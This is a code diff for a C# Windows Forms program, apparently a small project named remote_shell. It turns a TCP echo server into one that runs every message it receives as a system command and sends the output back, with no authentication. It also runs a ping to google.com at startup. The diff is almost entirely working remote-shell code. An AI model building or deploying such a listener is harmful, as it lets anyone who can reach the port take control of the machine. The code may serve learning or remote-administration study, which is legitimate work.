@@ -18,10 +18,13 @@ namespace remote_shell
     {
         private Thread tcpServerThread = null;
         private TcpListener serverSocket = null;
+        private cmdProcess cmd = null; 
         
         public serverForm()
         {
             InitializeComponent();
+            cmd = new cmdProcess();
+            cmd.Execute("ping google.com");
             tcpServerThread = new Thread(serverThread);
             tcpServerThread.Start();
         }
@@ -38,17 +41,21 @@ namespace remote_shell
 
                 NetworkStream stream = clientSocket.GetStream();
                 byte[] buffer = new byte[1024];
-                int byte_count = stream.Read(buffer, 0, buffer.Length);
+                int bytesCount = stream.Read(buffer, 0, buffer.Length);
 
-                if (byte_count == 0) break;
+                if (bytesCount == 0) break;
 
-                string data = Encoding.UTF8.GetString(buffer, 0, byte_count);
+                string data = Encoding.UTF8.GetString(buffer, 0, bytesCount);
 
-                buffer = Encoding.UTF8.GetBytes(data);
+                buffer = Encoding.UTF8.GetBytes(cmd.Execute(data));
                 stream.Write(buffer, 0, buffer.Length);
             }
             clientSocket.Close();
-            serverSocket.Stop();
+        }
+
+        private void serverForm_Load(object sender, EventArgs e)
+        {
+            //serverThread();
         }
     }
 }
